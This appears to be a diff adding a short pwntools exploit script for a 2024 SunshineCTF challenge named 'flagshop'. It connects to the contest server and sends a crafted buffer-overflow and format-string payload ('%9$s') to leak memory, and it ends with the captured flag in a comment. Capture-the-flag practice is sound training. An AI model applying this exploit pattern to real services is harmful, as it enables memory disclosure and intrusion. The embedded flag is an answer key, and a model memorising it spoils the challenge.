@@ -1,0 +1,21 @@
+from pwn import *
+
+# bof + format string
+
+p = remote("2024.sunshinectf.games", 24001)
+#p = process("./flagshop")
+'''
+p = gdb.debug("./flagshop", gdbscript = 
+b *main + 83
+b *load_panel + 93
+)
+'''
+
+p.sendline(b"AAAA")
+p.sendline(b"AAAA")
+payload = b"B" * 2 + b"B" * 0x8 + b"%9$sBBBB" + b"B" * (0x8 + 1)
+p.sendline(payload)
+p.sendline(b"1")
+
+p.interactive()
+#sun{c@n_st1ll_r3@d_off_the_he@p_fr0m_st@ck_po!nters!}
